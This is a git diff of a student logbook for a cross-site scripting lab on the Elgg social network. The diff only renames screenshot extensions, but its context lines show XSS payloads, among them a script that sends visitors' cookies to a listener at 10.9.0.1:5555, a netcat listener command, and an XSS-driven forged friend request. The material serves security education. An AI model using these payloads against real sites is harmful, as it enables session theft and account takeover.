@@ -21,7 +21,7 @@ $ docker-compose up    # Start the container
 We verified we could access the container shells using ```dockersh``` by first identifying their container IDs with ```docker ps```:
 
 ![//](Images/logbook7/setup03.png)
-![//](Images/logbook7/setup04.png)
+![//](Images/logbook7/setup04.PNG)
 
 # Lab Tasks
 ## Task \#1: Displaying a Simple Alert
@@ -32,7 +32,7 @@ The objective of this task was to inject JavaScript code into an Elgg user profi
 
 The attack was successful. When Boby visited Alice's profile, the alert pop-up appeared automatically, demonstrating that the XSS vulnerability allows the execution of JavaScript code in other users browsers.
 
-![//](Images/logbook7/task1-02.png)
+![//](Images/logbook7/task1-02.PNG)
 
 ## Task \#2: Stealing Cookies via Alert
 
@@ -42,11 +42,11 @@ This task instead of a simple message, the malicious script now displays the use
 <script>alert("XSS: "+ document.cookie);</script>
 ```
 
-![//](Images/logbook7/task2-01.png)
+![//](Images/logbook7/task2-01.PNG)
 
 Now, whenever any user views Alice's profile, their cookies are displayed in an alert message. This is dangerous because cookies often contain sensitive authentication data such as session tokens. With these stolen cookies, the attacker could impersonate the victim, hijack their session, and gain full access to their account without ever needing their password.
 
-![//](Images/logbook7/task2-02.png)
+![//](Images/logbook7/task2-02.PNG)
 
 ## Task \#3: Sending Cookies to the Attacker
 
@@ -57,13 +57,13 @@ document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>
 </script>
 ```
 
-![//](Images/logbook7/task3-01.png)
+![//](Images/logbook7/task3-01.PNG)
 
 This script exploits the browser's image loading mechanism to send cookies via a GET request. When Alice's profile page is rendered, the browser attempts to load an image from the attacker's server (10.9.0.1:5555), embedding the victim's cookies in the URL query string.
 
 To intercept these requests, we opened a terminal and started a netcat listener with the command: ```nc -lknv 5555```. We then logged into another account (Boby) and visited Alice's profile. As expected, we received Boby's session cookies on our listener:
 
-![//](Images/logbook7/task3-02.png)
+![//](Images/logbook7/task3-02.PNG)
 
 This demonstrates how XSS attacks can be used for credential theft without the victim's knowledge.
 
@@ -73,7 +73,7 @@ The objective of this task was to create a "self-propagating" friend request att
 
 First, we needed to understand how friend requests work in Elgg. We logged into Samy's account, manually sent a friend request to another user, and captured the HTTP request using the **HTTP Header Live** browser extension:
 
-![//](Images/logbook7/task4-01.png)
+![//](Images/logbook7/task4-01.PNG)
 
 From the captured request, we identified the required parameters:
 - **Endpoint:** `http://www.seed-server.com/action/friends/add`
@@ -126,11 +126,11 @@ The script works as follows:
    
 To test the attack, we logged into Alice's account and visited Samy's profile:
 
-![//](Images/logbook7/task4-02.png)
+![//](Images/logbook7/task4-02.PNG)
 
 After refreshing Alice's friends page, we confirmed that Samy had been added as a friend automatically, without Alice clicking any "Add Friend" button:
 
-![//](Images/logbook7/task4-03.png)
+![//](Images/logbook7/task4-03.PNG)
 
 This demonstrates a Cross-Site Request Forgery (CSRF) attack delivered via XSS, where the attacker can force authenticated users to perform unwanted actions (in this case, sending a friend request) simply by viewing a compromised profile.
 
